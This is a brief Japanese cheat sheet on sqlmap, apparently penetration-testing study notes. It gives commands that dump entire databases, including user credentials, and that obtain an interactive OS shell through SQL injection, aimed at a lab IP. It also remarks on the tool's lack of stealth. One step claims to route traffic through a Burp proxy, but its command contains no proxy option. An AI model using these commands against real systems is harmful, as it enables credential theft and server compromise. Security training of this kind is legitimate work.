# sqlmap
[公式ページ](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

## 概要
sqlmapはKaliにデフォルトでインストールされている。  
SQLiのプロセスはsqlmapを使って様々なDBエンジンに対するSQLiの脆弱性を特定・悪用ができる。  


## コマンド集

-u => ターゲットを指定
-p => テストするパラメータを指定
--dump => ユーザ認証情報を含めてDB全体をダンプする

簡単なSQLiテストのコマンド実行。  
userパラメータの後ろにダミーで1を指定しており、Time-based SQLiを行う。
```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

> [!NOTE]  
> sqlmapは大量のトラフィックが発生するため、ステルス性はゼロに等しい。ステルス性を重視する場合は使用しない方が良い。


-r => Burp等で取得したPOSTリクエストをtxt形式で保存しておき、それを引数としてとる  
-p => パラメータ。POSTの中にある脆弱なパラメータを指定する。  
--os-shell => 以下の--web-rootと一緒にオプションに含め、対話的にシェルを取る  
--web-root => 書き込み可能なカスタムフォルダを指定  


ターゲットのWebアプリケーションと対話的にやり取りをするためのコマンド。Time-based SQLiだと時間がかかるという場合に便利。
```
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```

3. Burpから取得しておいたget.txtのリクエストを-rで引数指定。searchパラメータに対する値をインジェクションのポイントにする。--os-shellでシェルを獲得する。  
```
sqlmap -r get.txt -p search --os-shell
```

4. sqlmapにburpのproxyを設定してデバッグ実行
```
sqlmap -r ./get.txt -p <parameter name> --os-shell
```
